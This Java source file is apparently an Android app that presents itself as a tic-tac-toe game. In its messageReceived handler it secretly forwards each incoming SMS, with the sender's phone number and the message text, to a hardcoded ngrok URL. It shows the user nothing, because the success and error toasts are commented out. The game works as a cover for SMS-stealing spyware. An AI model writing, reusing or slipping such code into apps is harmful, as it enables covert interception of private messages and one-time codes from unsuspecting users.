package com.example.readincomingmsg;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;


import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity implements MessageListener {

    public final String ngrokID="bf23e5b7";

    //Player representation
    //0-X
    //1-O

    int activePlayer=0;
    int[] gameState={2,2,2,2,2,2,2,2,2,2};//array length is 10 because of 1 based indexing
    //state meaning
    //0-X
    //1-O
    //2-NULL

    int [][]win={{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}};
    boolean gameActive=true;
    public void playerTap(View view){
        if(!gameActive){
            gameReset(view);
        }


        ImageView img=(ImageView)view;
        int tappedImage=Integer.parseInt(img.getTag().toString());
        if(gameState[tappedImage]==2 && gameActive){
            gameState[tappedImage]=activePlayer;
            img.setTranslationY(-1000f);
            TextView status=findViewById(R.id.status);
            if(activePlayer==0){
                img.setImageResource(R.drawable.x);
                activePlayer=1;

                status.setText("O's turn-Tap to play");
            }
            else if(activePlayer==1){
                img.setImageResource(R.drawable.o);
                activePlayer=0;

                status.setText("X's turn-Tap to play");
            }
            //check if anyone has won
            for(int x[]:win){
                if(gameState[x[0]]==gameState[x[1]]&&gameState[x[1]]==gameState[x[2]]&&gameState[x[2]]!=2){
                    //somebody has won
                    gameActive=false;
                    if(activePlayer==0){//we have already changed activePlayer above so have to write opposite logic here
                        status.setText("O has won");
                        break;
                    }
                    else if(activePlayer==1){
                        status.setText("X has won");
                        break;
                    }
                    gameActive=false;
                }
            }

            //check if all blocks are filled and no one has won
            if(gameActive){
                for(int i=1;i<=9;i++){
                    if(gameState[i]==2){//so this block if empty
                        break;
                    }
                    else if(i==9){
                        //checked all blocks and none is empty i.e all are filled with x and 0
                        status.setText("Its a draw!");
                        gameActive=false;
                    }
                }
            }


            img.animate().translationYBy(1000f).setDuration(300);
        }

    }
    public void gameReset(View view){
        gameActive=true;
        activePlayer=0;
        for(int i=1;i<gameState.length;i++){
            gameState[i]=2;
        }
        ((ImageView)findViewById(R.id.imageView1)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView2)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView3)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView4)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView5)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView6)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView7)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView8)).setImageResource(0);
        ((ImageView)findViewById(R.id.imageView9)).setImageResource(0);

        TextView status=findViewById(R.id.status);
        status.setText("X's turn-Tap to play");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        MessageReceiver.bindListener(this);


    }

    @Override
    public void messageReceived(final String senderPhoneNumber, String emailFrom, String emailBody, String msgBody, long timeStamp, String Message) {
        Log.d("msgInfo",senderPhoneNumber);
        Log.d("msgInfo",Message);


        final RequestQueue requestQueue;
        requestQueue= Volley.newRequestQueue(MainActivity.this);
        String url = "https://"+ngrokID+".ngrok.io/";
        final String finalMsg = Message;

        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
//                Toast.makeText(MainActivity.this, response, Toast.LENGTH_SHORT).show();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
//                Toast.makeText(MainActivity.this, error.toString(), Toast.LENGTH_SHORT).show();
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("phone_no", senderPhoneNumber);
                MyData.put("Message", finalMsg);
                return MyData;
            }
        };
        requestQueue.add(MyStringRequest);



    }



}
